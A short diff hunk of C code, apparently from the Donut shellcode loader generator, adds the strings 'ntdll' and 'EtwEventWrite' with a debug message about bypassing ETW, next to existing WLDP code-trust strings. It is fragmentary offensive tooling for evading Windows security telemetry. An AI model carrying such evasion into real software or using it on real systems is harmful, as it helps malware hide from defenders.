@@ -974,6 +974,10 @@ static int build_instance(PDONUT_CONFIG c) {
       strcpy(inst->wldp,           "wldp");
       strcpy(inst->wldpQuery,      "WldpQueryDynamicCodeTrust");
       strcpy(inst->wldpIsApproved, "WldpIsClassInApprovedList");
+
+      DPRINT("Copying strings required to bypass ETW");
+      strcpy(inst->ntdll, "ntdll");
+      strcpy(inst->etwEventWrite, "EtwEventWrite");
     }
     
     // if module is an unmanaged EXE
